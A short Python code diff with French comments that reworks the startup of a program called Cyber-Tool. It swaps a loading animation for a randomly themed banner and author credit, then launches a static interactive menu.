-    cyberpunk_loading("🚀 Démarrage de l’environnement CYBER-TOOL...", 3, "bold green", "moon")
+    # Affichage d'une bannière aléatoire utilisant le nouveau thème
+    animated_random_banner()  # Cette fonction doit utiliser la variable CYBERPUNK_COLORS pour chaque ligne
+    animated_karim()         # Affichage de "Développé par Karim" en utilisant également le thème aléatoire
 
-    # ✅ Suppression des animations temporaires pour éviter les doublons
-    console.clear()
-
-    # ✅ Affichage unique et stable de la bannière et du message "Développé par Karim"
-    animated_banner()
-    animated_karim()
-
-    # ✅ Lancement immédiat de CyberTool sans répétition des animations
-    cyber_tool = CyberTool()
-    cyber_tool.run_tool()
+    cyber_tool = CyberTool()  # Initialisation de Cyber-Tool
+    cyber_tool.run_tool_static()  # Lancement du menu interactif statique
